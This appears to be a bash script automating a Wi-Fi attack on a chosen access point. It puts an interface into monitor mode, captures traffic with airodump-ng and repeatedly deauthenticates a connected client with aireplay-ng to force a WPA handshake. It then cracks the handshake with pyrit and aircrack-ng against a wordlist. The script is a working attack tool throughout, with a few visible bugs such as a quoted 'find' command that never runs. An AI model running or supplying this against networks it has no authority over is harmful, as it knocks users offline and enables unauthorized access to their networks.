#!/bin/bash

echo "           AUTO WIFI With airolib";
echo "           ======================";
echo "All variables are strickt - failing is in your hands";
echo "What you want to call this:";
read Proj;
read -p "What Interface will you use: " Iface;
mon=$Iface'mon';
read -p "What is the friendly name of the AP: " ESSID;
read -p "what is the MAc of the AP: " BSSID;
read -p "What Channel is the AP on: " Chan;

#Lets Play ball
echo "checking for Project Folder";
if [ -d ../$Proj ]
then
	echo "Clearing old Content";
	rm -rf ../$Proj/*.*
else
	"Creating New Dir";
	mkdir ../$Proj
fi

echo "checking wlan1mon";
airmon-ng check kill
airmon-ng start $Iface --channel $Chan
echo "monitor is set on $mon";
echo "For Good Riddance we need to wait a second";

echo "Pasting to new shell";
gnome-terminal -x sh -c "
	sleep 4;
	cd ../$Proj;
	airodump-ng -c $Chan --bssid $BSSID -w $Proj $mon;
	"
echo "Check airoDump Manually for a Client";
sleep 10;
read -p "Do you have a client Mac: " Client;

deauth(){
read -p "How many Deauths you want to send: " da;

echo "Opening new Shell for Deauth";

gnome-terminal -x sh -c "
	sleep 3;
	aireplay-ng -0 $da -a $BSSID -c $Client $mon;
	"
sleep $da;
echo "deauths send"

}
deauth;


while true; do

	read -p  "Do you want to try to Deaut Again? Yes, No. (Y/N) " ans;
	case $ans in
		y|Y )
			deauth;;
		n|N )
			break;;
		* ) echo "Please answer yes or no.";;
	esac
done

cd ../$Proj;
result='find *.cap' ;
pyrit -r $result analyze;

#read -p "Location of a dictionary" dic;


dic=../wordlist/export.db

gnome-terminal -x sh -c "
        sleep 3;
        aircrack-ng -w  $dic -b $BSSID $result;
        "



read -n1 -p "Press Enter to Exit" key;
